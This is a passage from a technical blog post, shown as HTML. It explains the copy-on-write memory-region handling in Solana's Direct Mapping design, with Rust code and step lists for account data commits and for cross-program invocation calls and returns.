<span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">31</span><span></span><span class="token token" style="color:#cc99cd">fn</span><span> </span><span class="token token function-definition" style="color:#f08d49">ensure_writable_region</span><span class="token token" style="color:#ccc">(</span><span>region</span><span class="token token" style="color:#ccc">:</span><span> </span><span class="token token" style="color:#67cdcc">&amp;</span><span class="token token" style="color:#f8c555">MemoryRegion</span><span class="token token" style="color:#ccc">,</span><span> cow_cb</span><span class="token token" style="color:#ccc">:</span><span> </span><span class="token token" style="color:#67cdcc">&amp;</span><span class="token token" style="color:#f8c555">Option</span><span class="token token" style="color:#67cdcc">&lt;</span><span class="token token" style="color:#f8c555">MemoryCowCallback</span><span class="token token" style="color:#67cdcc">&gt;</span><span class="token token" style="color:#ccc">)</span><span> </span><span class="token token" style="color:#ccc">-&gt;</span><span> </span><span class="token token" style="color:#cc99cd">bool</span><span> </span><span class="token token" style="color:#ccc">{</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">32</span><span>    </span><span class="token token" style="color:#cc99cd">match</span><span> </span><span class="token token" style="color:#ccc">(</span><span>region</span><span class="token token" style="color:#ccc">.</span><span>state</span><span class="token token" style="color:#ccc">.</span><span class="token token" style="color:#f08d49">get</span><span class="token token" style="color:#ccc">(</span><span class="token token" style="color:#ccc">)</span><span class="token token" style="color:#ccc">,</span><span> cow_cb</span><span class="token token" style="color:#ccc">)</span><span> </span><span class="token token" style="color:#ccc">{</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">33</span><span>        </span><span class="token token" style="color:#ccc">(</span><span class="token token" style="color:#f8c555">MemoryState</span><span class="token token" style="color:#ccc">::</span><span class="token token" style="color:#f8c555">Writable</span><span class="token token" style="color:#ccc">,</span><span> _</span><span class="token token" style="color:#ccc">)</span><span> </span><span class="token token" style="color:#67cdcc">=&gt;</span><span> </span><span class="token token" style="color:#f08d49">true</span><span class="token token" style="color:#ccc">,</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">34</span><span>        </span><span class="token token" style="color:#ccc">(</span><span class="token token" style="color:#f8c555">MemoryState</span><span class="token token" style="color:#ccc">::</span><span class="token token" style="color:#f8c555">Cow</span><span class="token token" style="color:#ccc">(</span><span>cow_id</span><span class="token token" style="color:#ccc">)</span><span class="token token" style="color:#ccc">,</span><span> </span><span class="token token" style="color:#f8c555">Some</span><span class="token token" style="color:#ccc">(</span><span>cb</span><span class="token token" style="color:#ccc">)</span><span class="token token" style="color:#ccc">)</span><span> </span><span class="token token" style="color:#67cdcc">=&gt;</span><span> </span><span class="token token" style="color:#cc99cd">match</span><span> </span><span class="token token" style="color:#f08d49">cb</span><span class="token token" style="color:#ccc">(</span><span>cow_id</span><span class="token token" style="color:#ccc">)</span><span> </span><span class="token token" style="color:#ccc">{</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">35</span><span>            </span><span class="token token" style="color:#f8c555">Ok</span><span class="token token" style="color:#ccc">(</span><span>host_addr</span><span class="token token" style="color:#ccc">)</span><span> </span><span class="token token" style="color:#67cdcc">=&gt;</span><span> </span><span class="token token" style="color:#ccc">{</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">36</span><span>                region</span><span class="token token" style="color:#ccc">.</span><span>host_addr</span><span class="token token" style="color:#ccc">.</span><span class="token token" style="color:#f08d49">replace</span><span class="token token" style="color:#ccc">(</span><span>host_addr</span><span class="token token" style="color:#ccc">)</span><span class="token token" style="color:#ccc">;</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">37</span><span>                region</span><span class="token token" style="color:#ccc">.</span><span>state</span><span class="token token" style="color:#ccc">.</span><span class="token token" style="color:#f08d49">replace</span><span class="token token" style="color:#ccc">(</span><span class="token token" style="color:#f8c555">MemoryState</span><span class="token token" style="color:#ccc">::</span><span class="token token" style="color:#f8c555">Writable</span><span class="token token" style="color:#ccc">)</span><span class="token token" style="color:#ccc">;</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">38</span><span>                </span><span class="token token" style="color:#f08d49">true</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">39</span><span>            </span><span class="token token" style="color:#ccc">}</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">40</span><span>            </span><span class="token token" style="color:#f8c555">Err</span><span class="token token" style="color:#ccc">(</span><span>_</span><span class="token token" style="color:#ccc">)</span><span> </span><span class="token token" style="color:#67cdcc">=&gt;</span><span> </span><span class="token token" style="color:#f08d49">false</span><span class="token token" style="color:#ccc">,</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">41</span><span>        </span><span class="token token" style="color:#ccc">}</span><span class="token token" style="color:#ccc">,</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">42</span><span>        _ </span><span class="token token" style="color:#67cdcc">=&gt;</span><span> </span><span class="token token" style="color:#f08d49">false</span><span class="token token" style="color:#ccc">,</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">43</span><span>    </span><span class="token token" style="color:#ccc">}</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">44</span><span></span><span class="token token" style="color:#ccc">}</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">45</span>
<span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">46</span><span></span><span class="token token" style="color:#cc99cd">impl</span><span class="token token" style="color:#67cdcc">&lt;</span><span class="token token lifetime-annotation" style="color:#f8c555">&#x27;a</span><span class="token token" style="color:#67cdcc">&gt;</span><span> </span><span class="token token" style="color:#f8c555">UnalignedMemoryMapping</span><span class="token token" style="color:#67cdcc">&lt;</span><span class="token token lifetime-annotation" style="color:#f8c555">&#x27;a</span><span class="token token" style="color:#67cdcc">&gt;</span><span> </span><span class="token token" style="color:#ccc">{</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">47</span><span>    </span><span class="token token" style="color:#ccc">...</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">48</span><span>    </span><span class="token token" style="color:#cc99cd">pub</span><span> </span><span class="token token" style="color:#cc99cd">fn</span><span> </span><span class="token token function-definition" style="color:#f08d49">store</span><span class="token token" style="color:#67cdcc">&lt;</span><span class="token token" style="color:#f8c555">T</span><span class="token token" style="color:#ccc">:</span><span> </span><span class="token token" style="color:#f8c555">Pod</span><span class="token token" style="color:#67cdcc">&gt;</span><span class="token token" style="color:#ccc">(</span><span class="token token" style="color:#67cdcc">&amp;</span><span class="token token" style="color:#cc99cd">self</span><span class="token token" style="color:#ccc">,</span><span> value</span><span class="token token" style="color:#ccc">:</span><span> </span><span class="token token" style="color:#f8c555">T</span><span class="token token" style="color:#ccc">,</span><span> </span><span class="token token" style="color:#cc99cd">mut</span><span> vm_addr</span><span class="token token" style="color:#ccc">:</span><span> </span><span class="token token" style="color:#cc99cd">u64</span><span class="token token" style="color:#ccc">,</span><span> pc</span><span class="token token" style="color:#ccc">:</span><span> </span><span class="token token" style="color:#cc99cd">usize</span><span class="token token" style="color:#ccc">)</span><span> </span><span class="token token" style="color:#ccc">-&gt;</span><span> </span><span class="token token" style="color:#f8c555">ProgramResult</span><span> </span><span class="token token" style="color:#ccc">{</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">49</span><span>        </span><span class="token token" style="color:#cc99cd">let</span><span> </span><span class="token token" style="color:#cc99cd">mut</span><span> len </span><span class="token token" style="color:#67cdcc">=</span><span> </span><span class="token token" style="color:#e2777a">mem</span><span class="token token" style="color:#ccc">::</span><span class="token token" style="color:#f08d49">size_of</span><span class="token token" style="color:#ccc">::</span><span class="token token" style="color:#67cdcc">&lt;</span><span class="token token" style="color:#f8c555">T</span><span class="token token" style="color:#67cdcc">&gt;</span><span class="token token" style="color:#ccc">(</span><span class="token token" style="color:#ccc">)</span><span> </span><span class="token token" style="color:#cc99cd">as</span><span> </span><span class="token token" style="color:#cc99cd">u64</span><span class="token token" style="color:#ccc">;</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">50</span>
<span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">51</span><span>        </span><span class="token token" style="color:#cc99cd">let</span><span> cache </span><span class="token token" style="color:#67cdcc">=</span><span> </span><span class="token token" style="color:#cc99cd">unsafe</span><span> </span><span class="token token" style="color:#ccc">{</span><span> </span><span class="token token" style="color:#67cdcc">&amp;</span><span class="token token" style="color:#cc99cd">mut</span><span> </span><span class="token token" style="color:#67cdcc">*</span><span class="token token" style="color:#cc99cd">self</span><span class="token token" style="color:#ccc">.</span><span>cache</span><span class="token token" style="color:#ccc">.</span><span class="token token" style="color:#f08d49">get</span><span class="token token" style="color:#ccc">(</span><span class="token token" style="color:#ccc">)</span><span> </span><span class="token token" style="color:#ccc">}</span><span class="token token" style="color:#ccc">;</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">52</span>
<span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">53</span><span>        </span><span class="token token" style="color:#cc99cd">let</span><span> </span><span class="token token" style="color:#cc99cd">mut</span><span> src </span><span class="token token" style="color:#67cdcc">=</span><span> </span><span class="token token" style="color:#67cdcc">&amp;</span><span>value </span><span class="token token" style="color:#cc99cd">as</span><span> </span><span class="token token" style="color:#67cdcc">*</span><span class="token token" style="color:#cc99cd">const</span><span> _ </span><span class="token token" style="color:#cc99cd">as</span><span> </span><span class="token token" style="color:#67cdcc">*</span><span class="token token" style="color:#cc99cd">const</span><span> </span><span class="token token" style="color:#cc99cd">u8</span><span class="token token" style="color:#ccc">;</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">54</span>
<span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">55</span><span>        </span><span class="token token" style="color:#cc99cd">let</span><span> </span><span class="token token" style="color:#cc99cd">mut</span><span> region </span><span class="token token" style="color:#67cdcc">=</span><span> </span><span class="token token" style="color:#cc99cd">match</span><span> </span><span class="token token" style="color:#cc99cd">self</span><span class="token token" style="color:#ccc">.</span><span class="token token" style="color:#f08d49">find_region</span><span class="token token" style="color:#ccc">(</span><span>cache</span><span class="token token" style="color:#ccc">,</span><span> vm_addr</span><span class="token token" style="color:#ccc">)</span><span> </span><span class="token token" style="color:#ccc">{</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">56</span><span>            </span><span class="token token" style="color:#f8c555">Some</span><span class="token token" style="color:#ccc">(</span><span>region</span><span class="token token" style="color:#ccc">)</span><span> </span><span class="token token" style="color:#cc99cd">if</span><span> </span><span class="token token" style="color:#f08d49">ensure_writable_region</span><span class="token token" style="color:#ccc">(</span><span>region</span><span class="token token" style="color:#ccc">,</span><span> </span><span class="token token" style="color:#67cdcc">&amp;</span><span class="token token" style="color:#cc99cd">self</span><span class="token token" style="color:#ccc">.</span><span>cow_cb</span><span class="token token" style="color:#ccc">)</span><span> </span><span class="token token" style="color:#67cdcc">=&gt;</span><span> </span><span class="token token" style="color:#ccc">{</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">57</span><span>                </span><span class="token token" style="color:#999">// fast path</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">58</span><span>                </span><span class="token token" style="color:#cc99cd">if</span><span> </span><span class="token token" style="color:#cc99cd">let</span><span> </span><span class="token token" style="color:#f8c555">ProgramResult</span><span class="token token" style="color:#ccc">::</span><span class="token token" style="color:#f8c555">Ok</span><span class="token token" style="color:#ccc">(</span><span>host_addr</span><span class="token token" style="color:#ccc">)</span><span> </span><span class="token token" style="color:#67cdcc">=</span><span> region</span><span class="token token" style="color:#ccc">.</span><span class="token token" style="color:#f08d49">vm_to_host</span><span class="token token" style="color:#ccc">(</span><span>vm_addr</span><span class="token token" style="color:#ccc">,</span><span> len</span><span class="token token" style="color:#ccc">)</span><span> </span><span class="token token" style="color:#ccc">{</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">59</span><span>                    </span><span class="token token" style="color:#999">// Safety:</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">60</span><span>                    </span><span class="token token" style="color:#999">// vm_to_host() succeeded so we know there&#x27;s enough space to</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">61</span><span>                    </span><span class="token token" style="color:#999">// store `value`</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">62</span><span>                    </span><span class="token token" style="color:#cc99cd">unsafe</span><span> </span><span class="token token" style="color:#ccc">{</span><span> </span><span class="token token" style="color:#e2777a">ptr</span><span class="token token" style="color:#ccc">::</span><span class="token token" style="color:#f08d49">write_unaligned</span><span class="token token" style="color:#ccc">(</span><span>host_addr </span><span class="token token" style="color:#cc99cd">as</span><span> </span><span class="token token" style="color:#67cdcc">*</span><span class="token token" style="color:#cc99cd">mut</span><span> _</span><span class="token token" style="color:#ccc">,</span><span> value</span><span class="token token" style="color:#ccc">)</span><span> </span><span class="token token" style="color:#ccc">}</span><span class="token token" style="color:#ccc">;</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">63</span><span>                    </span><span class="token token" style="color:#cc99cd">return</span><span> </span><span class="token token" style="color:#f8c555">ProgramResult</span><span class="token token" style="color:#ccc">::</span><span class="token token" style="color:#f8c555">Ok</span><span class="token token" style="color:#ccc">(</span><span>host_addr</span><span class="token token" style="color:#ccc">)</span><span class="token token" style="color:#ccc">;</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">64</span><span>                </span><span class="token token" style="color:#ccc">}</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">65</span>                region
<span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">66</span><span>            </span><span class="token token" style="color:#ccc">}</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">67</span><span>            _ </span><span class="token token" style="color:#67cdcc">=&gt;</span><span> </span><span class="token token" style="color:#ccc">{</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">68</span><span>                </span><span class="token token" style="color:#cc99cd">return</span><span> </span><span class="token token" style="color:#f08d49">generate_access_violation</span><span class="token token" style="color:#ccc">(</span><span class="token token" style="color:#cc99cd">self</span><span class="token token" style="color:#ccc">.</span><span>config</span><span class="token token" style="color:#ccc">,</span><span> </span><span class="token token" style="color:#f8c555">AccessType</span><span class="token token" style="color:#ccc">::</span><span class="token token" style="color:#f8c555">Store</span><span class="token token" style="color:#ccc">,</span><span> vm_addr</span><span class="token token" style="color:#ccc">,</span><span> len</span><span class="token token" style="color:#ccc">,</span><span> pc</span><span class="token token" style="color:#ccc">)</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">69</span><span>            </span><span class="token token" style="color:#ccc">}</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">70</span><span>        </span><span class="token token" style="color:#ccc">}</span><span class="token token" style="color:#ccc">;</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">71</span>
<span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">72</span><span>        </span><span class="token token" style="color:#999">// slow path, handle writes that span multiple memory regions</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">73</span><span>        </span><span class="token token" style="color:#ccc">...</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">74</span><span>    </span><span class="token token" style="color:#ccc">}</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">75</span><span>    </span><span class="token token" style="color:#ccc">...</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">76</span><span></span><span class="token token" style="color:#ccc">}</span></code></div></div></pre>
<h3 class="text-2xl sm:text-3xl mt-6 mb-2 text-white">Commit Process Changes</h3>
<p class="text-lg sm:text-xl mb-4 text-pretty sm:text-justify text-white/70 leading-relaxed">The new CoW strategy also changes how account data is committed due to the mapping constraints:</p>
<p class="text-lg sm:text-xl mb-4 text-pretty sm:text-justify text-white/70 leading-relaxed"><strong class="font-semibold text-white">Directly Mapped Data</strong>: The original data length portion has already been modified through direct mapping and requires no additional copying.</p>
<p class="text-lg sm:text-xl mb-4 text-pretty sm:text-justify text-white/70 leading-relaxed"><strong class="font-semibold text-white">Growth Area Data</strong>: When programs expand account data using <code class="whitespace-nowrap rounded px-1 border border-white/20 text-white font-mono" style="background:rgba(255, 255, 255, 0.1);font-size:0.9em">realloc()</code>, the new data initially lives in the reserved buffer space within the <code class="whitespace-nowrap rounded px-1 border border-white/20 text-white font-mono" style="background:rgba(255, 255, 255, 0.1);font-size:0.9em">INPUT</code> section. Since the reserved buffer isn&#x27;t mapped to host memory (we can only map the exact current data size), an additional copy operation is required to move growth data from the unmapped reserved buffer to the actual account data buffer in host memory.</p>
<p class="text-lg sm:text-xl mb-4 text-pretty sm:text-justify text-white/70 leading-relaxed">This mapping constraint means that while Direct Mapping eliminates copying for existing data, growth scenarios still require copying from the unmapped reserved space.</p>
<h3 class="text-2xl sm:text-3xl mt-6 mb-2 text-white">Impact on Cross-Program Invocation</h3>
<p class="text-lg sm:text-xl mb-4 text-pretty sm:text-justify text-white/70 leading-relaxed">With data writes handled, the next thing to understand is how CPI works under the new design.</p>
<h4 class="text-xl sm:text-2xl mt-4 mb-2 text-white">CPI Call Process</h4>
<p class="text-lg sm:text-xl mb-4 text-pretty sm:text-justify text-white/70 leading-relaxed">The CPI call process remains quite similar to the original design. Most steps are unchanged:</p>
<ol class="text-lg sm:text-xl py-2 text-pretty sm:text-justify text-white/70 list-decimal pl-6">
<li class="my-2">Retrieve metadata of accounts involved in the CPI instruction</li>
<li class="my-2">Look up corresponding <code class="whitespace-nowrap rounded px-1 border border-white/20 text-white font-mono" style="background:rgba(255, 255, 255, 0.1);font-size:0.9em">AccountSharedData</code> from the TransactionContext</li>
<li class="my-2">Translate guest addresses in <code class="whitespace-nowrap rounded px-1 border border-white/20 text-white font-mono" style="background:rgba(255, 255, 255, 0.1);font-size:0.9em">AccountInfo</code> into host pointers to construct <code class="whitespace-nowrap rounded px-1 border border-white/20 text-white font-mono" style="background:rgba(255, 255, 255, 0.1);font-size:0.9em">CallerAccount</code> structures</li>
<li class="my-2">Update reserved buffer and validate account changes and write them back to <code class="whitespace-nowrap rounded px-1 border border-white/20 text-white font-mono" style="background:rgba(255, 255, 255, 0.1);font-size:0.9em">AccountSharedData</code></li>
<li class="my-2">Serialize <code class="whitespace-nowrap rounded px-1 border border-white/20 text-white font-mono" style="background:rgba(255, 255, 255, 0.1);font-size:0.9em">AccountSharedData</code> into callee program&#x27;s <code class="whitespace-nowrap rounded px-1 border border-white/20 text-white font-mono" style="background:rgba(255, 255, 255, 0.1);font-size:0.9em">INPUT</code> section</li>
</ol>
<p class="text-lg sm:text-xl mb-4 text-pretty sm:text-justify text-white/70 leading-relaxed">A minor difference is, before step 4 validation, instead of copying the entire account data, we only copy newly grown data that&#x27;s still in the reserved buffer back to the newly allocated direct-mapped buffer and verify other fields then write them back into <code class="whitespace-nowrap rounded px-1 border border-white/20 text-white font-mono" style="background:rgba(255, 255, 255, 0.1);font-size:0.9em">AccountSharedData</code>.</p>
<p class="text-lg sm:text-xl mb-4 text-pretty sm:text-justify text-white/70 leading-relaxed"><span class="block my-8"><img class="mx-auto" src="/blog/2025_06_27/new_cpi_call.png" alt="New CPI Call"/></span></p>
<h4 class="text-xl sm:text-2xl mt-4 mb-2 text-white">CPI Return Process</h4>
<p class="text-lg sm:text-xl mb-4 text-pretty sm:text-justify text-white/70 leading-relaxed">The major differences occur when returning from a CPI call. Since we&#x27;re using direct mapping, Vector CoW operations might occur during nested calls, requiring us to check if the original data buffer mapping has been relocated.</p>
<p class="text-lg sm:text-xl mb-4 text-pretty sm:text-justify text-white/70 leading-relaxed">1-1. Copy data from reserved buffer back to the directly mapped data buffer.
1-2. Validate all account changes using the same rules as single program execution
2. Check if data buffer was relocated during CoW operations, if relocation occurred, update the parent&#x27;s <code class="whitespace-nowrap rounded px-1 border border-white/20 text-white font-mono" style="background:rgba(255, 255, 255, 0.1);font-size:0.9em">MemoryRegion.host_addr</code> to reflect the change
3. Ensure the account data length hasn&#x27;t exceeded the limits expected by the caller program
4. Write the consolidated account changes back into the parent program&#x27;s <code class="whitespace-nowrap rounded px-1 border border-white/20 text-white font-mono" style="background:rgba(255, 255, 255, 0.1);font-size:0.9em">INPUT</code> region</p>
<p class="text-lg sm:text-xl mb-4 text-pretty sm:text-justify text-white/70 leading-relaxed">Notably, steps 2 is a new action introduced by Direct Mapping. Since Vector CoW operations might occur during nested calls, we must detect buffer relocations and update memory mappings to maintain consistency.</p>
<p class="text-lg sm:text-xl mb-4 text-pretty sm:text-justify text-white/70 leading-relaxed"><span class="block my-8"><img class="mx-auto" src="/blog/2025_06_27/new_cpi_return.png" alt="New CPI Return"/></span></p>
<h3 class="text-2xl sm:text-3xl mt-6 mb-2 text-white">The <code class="whitespace-nowrap rounded px-1 border border-white/20 text-white font-mono" style="background:rgba(255, 255, 255, 0.1);font-size:0.9em">MemoryRegion</code> Update Mechanism</h3>
<p class="text-lg sm:text-xl mb-4 text-pretty sm:text-justify text-white/70 leading-relaxed">When CoW operations relocate account data buffers during CPI execution, the parent program&#x27;s <code class="whitespace-nowrap rounded px-1 border border-white/20 text-white font-mono" style="background:rgba(255, 255, 255, 0.1);font-size:0.9em">MemoryRegions</code> still point to the old buffer locations, we need to update it to reflect the change. So how exactly does the update mechanism look like?</p>
<p class="text-lg sm:text-xl mb-4 text-pretty sm:text-justify text-white/70 leading-relaxed"><code class="whitespace-nowrap rounded px-1 border border-white/20 text-white font-mono" style="background:rgba(255, 255, 255, 0.1);font-size:0.9em">MemoryRegion</code> manage virtual-to-host address mappings, with each region covering non-overlapping virtual address ranges. When a buffer gets relocated, we need to identify which specific <code class="whitespace-nowrap rounded px-1 border border-white/20 text-white font-mono" style="background:rgba(255, 255, 255, 0.1);font-size:0.9em">MemoryRegion</code> needs updating and modify its <code class="whitespace-nowrap rounded px-1 border border-white/20 text-white font-mono" style="background:rgba(255, 255, 255, 0.1);font-size:0.9em">host_addr</code> to point to the new location.</p>
<p class="text-lg sm:text-xl mb-4 text-pretty sm:text-justify text-white/70 leading-relaxed">Solana uses the <code class="whitespace-nowrap rounded px-1 border border-white/20 text-white font-mono" style="background:rgba(255, 255, 255, 0.1);font-size:0.9em">vm_data_addr</code> field stored in <code class="whitespace-nowrap rounded px-1 border border-white/20 text-white font-mono" style="background:rgba(255, 255, 255, 0.1);font-size:0.9em">CallerAccount</code> to locate the correct <code class="whitespace-nowrap rounded px-1 border border-white/20 text-white font-mono" style="background:rgba(255, 255, 255, 0.1);font-size:0.9em">MemoryRegion</code>:</p>
<ol class="text-lg sm:text-xl py-2 text-pretty sm:text-justify text-white/70 list-decimal pl-6">
<li class="my-2"><strong class="font-semibold text-white">Locate the Target Region</strong>: Use <code class="whitespace-nowrap rounded px-1 border border-white/20 text-white font-mono" style="background:rgba(255, 255, 255, 0.1);font-size:0.9em">vm_data_addr</code> to find the <code class="whitespace-nowrap rounded px-1 border border-white/20 text-white font-mono" style="background:rgba(255, 255, 255, 0.1);font-size:0.9em">MemoryRegion</code> that maps the account&#x27;s data. This address should correspond to a virtual address within one of the <code class="whitespace-nowrap rounded px-1 border border-white/20 text-white font-mono" style="background:rgba(255, 255, 255, 0.1);font-size:0.9em">MemoryRegion</code>&#x27;s ranges.</li>
